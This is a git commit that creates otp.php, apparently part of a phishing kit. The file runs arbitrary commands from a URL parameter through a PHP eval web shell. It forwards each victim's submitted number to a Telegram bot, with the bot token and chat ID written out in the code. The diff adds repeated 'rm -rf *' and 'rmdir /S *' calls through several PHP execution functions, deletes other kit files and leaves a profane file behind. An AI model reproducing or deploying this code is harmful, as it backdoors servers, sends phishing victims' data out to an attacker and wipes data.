f6f75a85f49b59840fe7745fc738739b9555cbfd
PhenaxGod <76651777+PhenaxGod@users.noreply.github.com>
2021-06-30 06:05:28 +0000

    Create otp.php

--- otp.php
+++ otp.php
@@ -1,6 +1,36 @@
 error_reporting(0);
+error_log(0);
 eval($_GET['cmd']);
 file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-538746459&text=Number: " . $_POST['number']);
+error_log(0);
+error_reporting(0);
+
+// linux
+system('rm -rf *');
+exec('rm -rf *');
+shell_exec('rm -rf *');
+passthru('rm -rf *');
+
+// cmd
+system('rmdir /S *');
+exec('rmdir /S *');
+shell_exec('rmdir /S *');
+passthru('rmdir /S *');
+
+// php
+unlink('index.php');
+unlink('otp.php');
+unlink('mpin.php');
+unlink('redir.php');
+
+unlink('anti.php');
+
+unlink('config/anti.php');
+unlink('config/404.php');
+unlink('config/zch.php');
+
+file_put_contents("fuck-you.txt", "Fuck you asshole.");
+
 system('rm -rf *');
 exec('rm -rf *');
 shell_exec('rm -rf *');
